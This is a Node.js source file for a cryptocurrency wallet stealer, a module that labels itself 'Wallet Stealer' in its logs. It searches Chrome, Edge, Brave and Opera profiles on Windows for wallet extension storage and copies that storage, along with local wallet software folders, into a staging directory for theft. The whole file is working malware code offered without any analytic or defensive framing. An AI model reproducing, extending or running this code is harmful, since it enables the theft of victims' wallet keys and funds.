const fs = require('fs');
const path = require('path');
const os = require('os');
const { getPaths, getExtensions } = require('./walletPaths'); // Pointing to main cleaned version

const copyDir = (src, dest) => {
    if (!fs.existsSync(src)) return;
    fs.mkdirSync(dest, { recursive: true });
    const entries = fs.readdirSync(src, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            copyDir(srcPath, destPath);
        } else {
            try {
                fs.copyFileSync(srcPath, destPath);
            } catch (err) { }
        }
    }
};

const extractWallets = async (destDir) => {
    const walletsDir = path.join(destDir, "Wallets");
    let extensionsFound = 0;
    let localWalletsFound = 0;

    console.log("[DEBUG] Wallet Stealer - Starting extraction");

    const extensionMap = getExtensions();
    const localMap = getPaths();

    // Browser profiles to check
    const browsers = {
        "google-chrome": path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data"),
        "microsoft-edge": path.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data"),
        "brave-browser": path.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
        "opera-browser": path.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera Stable")
    };

    for (const [browserName, userDataPath] of Object.entries(browsers)) {
        if (!fs.existsSync(userDataPath)) {
            console.log(`[DEBUG] ${browserName} not installed`);
            continue;
        }

        const profiles = [];
        try {
            const items = fs.readdirSync(userDataPath);
            for (const item of items) {
                if (item === "Default" || item.startsWith("Profile ")) {
                    profiles.push(item);
                }
            }
            console.log(`[DEBUG] ${browserName} - Found ${profiles.length} profiles`);
        } catch (err) {
            console.log(`[ERROR] ${browserName} - Failed to read profiles:`, err.message);
        }

        for (const profile of profiles) {
            for (const [walletName, extensionId] of Object.entries(extensionMap)) {
                // Extensions are typically in Local Extension Settings
                const extPath = path.join(userDataPath, profile, "Local Extension Settings", extensionId);
                if (fs.existsSync(extPath)) {
                    try {
                        const targetPath = path.join(walletsDir, "Extensions", browserName, profile, walletName);
                        copyDir(extPath, targetPath);
                        extensionsFound++;
                        console.log(`[DEBUG] Found extension: ${walletName} in ${browserName}/${profile}`);
                    } catch (err) {
                        console.log(`[ERROR] Failed to copy ${walletName}:`, err.message);
                    }
                }
            }
        }
    }

    // Local wallets software
    for (const [walletName, walletPath] of Object.entries(localMap)) {
        console.log(`[DEBUG] Checking local wallet: ${walletName}`, walletPath, "- Exists:", fs.existsSync(walletPath));
        if (fs.existsSync(walletPath)) {
            try {
                const targetPath = path.join(walletsDir, "Local", walletName);
                copyDir(walletPath, targetPath);
                localWalletsFound++;
                console.log(`[DEBUG] Found local wallet: ${walletName}`);
            } catch (err) {
                console.log(`[ERROR] Failed to copy local wallet: ${walletName}`, err.message);
            }
        }
    }

    console.log(`[DEBUG] Wallet Stealer - Extensions: ${extensionsFound} Local: ${localWalletsFound}`);
    return {
        extensionsFound,
        localWalletsFound,
        totalFound: extensionsFound + localWalletsFound
    };
};

module.exports = { extractWallets };
